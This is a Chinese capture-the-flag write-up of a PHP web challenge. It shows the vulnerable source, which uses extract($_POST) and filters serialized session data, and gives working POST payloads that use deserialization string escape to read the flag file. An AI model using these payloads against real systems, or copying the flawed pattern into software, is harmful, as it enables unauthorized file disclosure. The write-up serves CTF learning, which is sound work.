![](<./img/Pasted image 20221119110645.png>)

---
首页长这样

![](<./img/Pasted image 20221119110705.png>)

---
点开之后是源码
```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```

---
提示我们可能能在`phpinfo`中找到好东西
```php
/?f=phpinfo
```

![](<./img/Pasted image 20221119113417.png>)

果不其然发现了存放`flag`的文件名`

---
考虑到`filter`函数作用于序列化后的字符串

总体思路就是利用反序列化字符串逃逸使得`$userinfo['img']`结果为`base64_encode('d0g3_f1ag.php')`

部署到本地再加了两句

![](<./img/Pasted image 20221119212823.png>)
```php
_SESSION[phpfl1g]=;s:3:"123";s:3:"img";s:3:"abc";}
```
不得不吐槽php这语言各方面都好宽松QwQ

![](<./img/Pasted image 20221119212806.png>)

---
放靶机上跑去

url
```php
/?f=show_image
```
POST
```php
_SESSION[phpfl1g]=;s:3:"123";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```
![](<./img/Pasted image 20221119213410.png>)

再来一步
```php
_SESSION[phpfl1g]=;s:3:"123";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```
![](<./img/Pasted image 20221119213746.png>)

#Web #PHP #反序列化 #字符串逃逸